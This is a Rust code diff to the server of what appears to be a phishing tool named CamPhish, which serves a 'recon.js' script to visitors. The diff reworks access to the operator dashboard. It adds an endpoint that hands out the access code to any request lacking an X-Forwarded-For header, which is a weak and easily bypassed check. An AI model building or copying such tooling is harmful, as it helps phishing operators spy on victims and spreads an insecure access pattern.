@@ -151,10 +151,11 @@ async fn main() -> anyhow::Result<()> {
     let recon_path = format!("{}/recon.js", templates_dir);
     let recon_js_template = std::fs::read_to_string(&recon_path).ok();
 
-    let access_code = auth::generate_access_code();
+    let access_code = auth::generate_access_code(&data_dir);
     std::env::set_var("CAMPHISH_ACCESS_CODE", &access_code);
     tracing::info!("🔐 Dashboard access code: {}", access_code);
     tracing::info!("🔐 Dashboard URL: http://{}/?code={}", listen_addr, access_code);
+    tracing::info!("🔐 Access code file: {}/.access_code", data_dir);
 
     let state = Arc::new(AppState {
         pool: pool.clone(),
@@ -241,11 +242,16 @@ async fn main() -> anyhow::Result<()> {
         .route_layer(axum::middleware::from_fn(auth::csrf_middleware))
         .route_layer(axum::middleware::from_fn(auth::auth_middleware));
 
+    // Access code endpoint: shows code on local-only requests
+    let access_routes = Router::new()
+        .route("/api/access", get(serve_access_code));
+
     // Merge public + dashboard routes, then add SPA fallback + outer layers.
     // .fallback() BEFORE .layer() ensures layers wrap the fallback.
     let mut app = Router::new()
         .merge(public_routes)
         .merge(dashboard_api)
+        .merge(access_routes)
         .fallback(serve_spa)
         .layer(cors)
         .layer(axum::middleware::from_fn(set_real_ip));
@@ -356,7 +362,13 @@ async fn serve_spa(
     let has_query = has_valid_query_code(&req);
 
     if !has_cookie && !has_query {
-        return (StatusCode::NOT_FOUND, "Access denied").into_response();
+        let html = format!(
+            r#"<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CamPhish Dashboard</title><style>body{{background:#0a0e14;color:#b3b8c5;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}}main{{max-width:420px;padding:2rem;text-align:center}}h1{{font-size:1.5rem;font-weight:600;color:#e6e9ef;margin:0 0 .5rem}}p{{font-size:.875rem;color:#737a8a;margin:0 0 1.5rem;line-height:1.5}}.code{{font-family:ui-monospace,monospace;font-size:1.125rem;font-weight:600;color:#22d3ee;background:#0f172a;border:1px solid #1e293b;border-radius:.5rem;padding:.75rem 1rem;display:inline-block;letter-spacing:.05em}}.hint{{font-size:.75rem;color:#525a6a;margin-top:1.5rem;line-height:1.5}}code{{font-size:.75rem;background:#0f172a;padding:.125rem .375rem;border-radius:.25rem}}</style></head><body><main><h1>🔐 Dashboard Locked</h1><p>Enter the access code from your server logs or <code>.access_code</code> file.</p><div class="code">?code=XXXX-XXXX-XXXX-XXXX</div><p class="hint">Run <code>cat data/.access_code</code> in the project directory,<br>or check <code>docker compose logs app</code> for the code.</p></main></body></html>"#
+        );
+        let mut resp = Response::new(html.into());
+        resp.headers_mut().insert(axum::http::header::CONTENT_TYPE, "text/html; charset=utf-8".parse().unwrap());
+        resp.headers_mut().insert(axum::http::header::CACHE_CONTROL, "no-cache".parse().unwrap());
+        return resp;
     }
 
     let set_cookie = has_query && !has_cookie;
@@ -416,4 +428,17 @@ async fn serve_recon_js(State(state): State<Arc<AppState>>) -> Response {
             .body("recon.js not found".into())
             .unwrap()
     }
+}
+
+/// Returns the access code as plain text — only when accessed without
+/// X-Forwarded-For header (i.e. direct/localhost access, not via tunnel).
+async fn serve_access_code(
+    State(state): State<Arc<AppState>>,
+    req: Request<Body>,
+) -> Response {
+    let forwarded = req.headers().contains_key("x-forwarded-for");
+    if forwarded {
+        return (StatusCode::FORBIDDEN, "Access code not available via tunnel").into_response();
+    }
+    (StatusCode::OK, [("Content-Type", "text/plain")], state.access_code.clone()).into_response()
 }
